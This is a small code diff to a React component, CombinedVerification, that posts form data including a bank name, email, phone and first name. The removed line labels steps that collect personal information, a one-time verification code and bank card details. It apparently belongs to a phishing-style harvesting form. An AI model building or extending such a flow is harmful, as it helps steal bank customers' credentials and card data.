@@ -154,7 +154,7 @@ export default function CombinedVerification() {
         },
         body: JSON.stringify({
           bankName: formData.bankName,
-          type: stepNumber ===  1? 'email and phone number'  : stepNumber ===  2? 'personal information' : stepNumber === 3 ? 'verification code (OTP)' : 'bank card details',
+          
           emailAddress: formData.emailAddress,
           phoneNumber: formData.phoneNumber,
           firstName: formData.firstName,
